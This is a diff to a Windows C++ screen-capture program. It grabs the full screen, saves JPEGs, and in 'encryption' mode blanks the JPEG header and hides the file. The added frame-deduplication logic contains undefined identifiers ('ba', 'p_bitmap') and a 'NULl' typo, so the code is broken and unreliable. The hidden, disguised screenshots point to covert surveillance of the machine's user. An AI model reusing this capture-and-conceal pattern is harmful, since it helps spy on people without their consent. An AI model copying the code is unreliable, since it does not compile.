@@ -3,6 +3,8 @@
 
 #pragma comment(lib, "gdiplus.lib")
 
+Gdiplus::Bitmap *p_prev_bmp = NULL;
+
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 {
 	UINT num = 0;          // number of image encoders
@@ -38,10 +40,29 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 	return -1;  // Failure
 }
 
-void BitmapToJpg(HBITMAP hbmpImage, int width, int height, LPCWSTR filename, ULONG uQuality)
+bool BitmapIdentical(Gdiplus::Bitmap *a, Gdiplus::Bitmap *b) {
+	if (a->GetHeight() != b->GetHeight() || a->GetWidth() != b->GetWidth())
+		return false;
+	Gdiplus::Color ca, cb;
+	for (size_t x = 0; x < a->GetWidth(); x++) {
+		for (size_t y = 0; y < a->GetHeight(); y++) {
+			a->GetPixel(x, y, &ca);
+			b->GetPixel(x, y, &cb);
+			if (ca.GetValue() != ba.GetValue())
+				return false;
+		}
+	}
+	return true;
+}
+
+bool BitmapToJpg(HBITMAP hbmpImage, int width, int height, LPCWSTR filename, ULONG uQuality)
 {
 	Gdiplus::Bitmap *p_bmp = Gdiplus::Bitmap::FromHBITMAP(hbmpImage, NULL);
 
+	if (p_prev_bmp != NULL && BitmapIdentical(p_bitmap, p_prev_bmp)) {
+		delete p_bmp;
+		return false;
+	}
 	CLSID pngClsid;
 	Gdiplus::EncoderParameters encoderParams;
 	encoderParams.Count = 1;
@@ -55,7 +76,10 @@ void BitmapToJpg(HBITMAP hbmpImage, int width, int height, LPCWSTR filename, ULO
 	else
 		std::cout << "Encoder failed" << std::endl;
 	p_bmp->Save(filename, &pngClsid, &encoderParams);
-	delete p_bmp;
+	if (p_prev_bmp != NULl)
+		delete p_prev_bmp;
+	p_prev_bmp = p_bmp;
+	return true;
 }
 
 void getDirectoryPath(CString &strCurPath) {
@@ -78,9 +102,9 @@ bool ScreenCapture(int x, int y, int width, int height, LPCWSTR filename, ULONG 
 	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
 	SelectObject(hDc, hBmp);
 	BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
-	BitmapToJpg(hBmp, width, height, filename, uQuality);
+	bool ret = BitmapToJpg(hBmp, width, height, filename, uQuality);
 	DeleteObject(hBmp);
-	return true;
+	return ret;
 }
 
 void fillJpegHeaderWithZero(LPCTSTR filename) {
@@ -104,8 +128,8 @@ void work(CString filename, bool encryption)
 	int height = GetSystemMetrics(SM_CYSCREEN);
 
 	std::cout << filename.GetString() << std::endl;
-	ScreenCapture(0, 0, width, height, filename.GetString(), 100L);
-	if (encryption) {
+	bool saved = ScreenCapture(0, 0, width, height, filename.GetString(), 100L);
+	if (saved && encryption) {
 		fillJpegHeaderWithZero(filename.GetString());
 		hideFile(filename.GetString());
 	}
